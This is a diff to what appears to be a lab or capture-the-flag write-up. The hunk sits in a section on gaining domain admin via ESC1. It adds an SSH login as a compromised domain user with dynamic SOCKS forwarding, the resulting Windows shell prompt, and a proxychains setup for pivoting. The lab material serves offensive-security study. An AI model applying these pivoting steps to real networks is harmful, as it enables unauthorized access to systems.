@@ -429,6 +429,20 @@ This user has now been compromised
 
 # Domain admin via ESC1
 ```python
+ssh nigel.mills@shibuya.vl -D 1080            
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+nigel.mills@shibuya.vl's password: 
+
+Microsoft Windows [Version 10.0.20348.3453]
+(c) Microsoft Corporation. All rights reserved.
+
+shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills>
+```
+Ive logged into SSH as this user using a socks p
+
+```python
 socks5  127.0.0.1 1080
 ```
 Ive started by adding this to `/etc/proxychains.conf`
